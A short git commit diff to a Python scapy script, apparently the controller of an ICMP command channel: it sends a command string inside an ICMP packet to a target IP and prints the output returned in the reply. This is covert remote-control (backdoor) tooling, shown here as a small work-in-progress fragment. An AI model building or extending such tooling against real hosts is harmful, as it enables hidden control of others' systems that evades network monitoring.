107495279338af3bdb94eda9bd7695cccc0af714
5h3r10ck <adilaheyad@gmail.com>
2020-08-12 11:56:30 +0100

    working on host

--- server.py
+++ server.py
@@ -14,8 +14,8 @@ args = parser.parse_args()
 
 def send_cmd(cmd):
 	packet = IP(dst=args.ip)/ICMP(id=0x6341, seq=0x1)/cmd
-	send(packet)
-	print("done")
+	resp = sr1(packet)
+	print(resp[0][0][Raw].load.decode('utf-8'))
 
 def recv_out():
 	out = sniff(filter="host 127.0.0.1 and icmp", count=2, iface="lo", timeout=2)
@@ -23,5 +23,5 @@ def recv_out():
 	print(out)
 	print("done 2")
 
-recv_out()
+#recv_out()
 send_cmd(args.command)
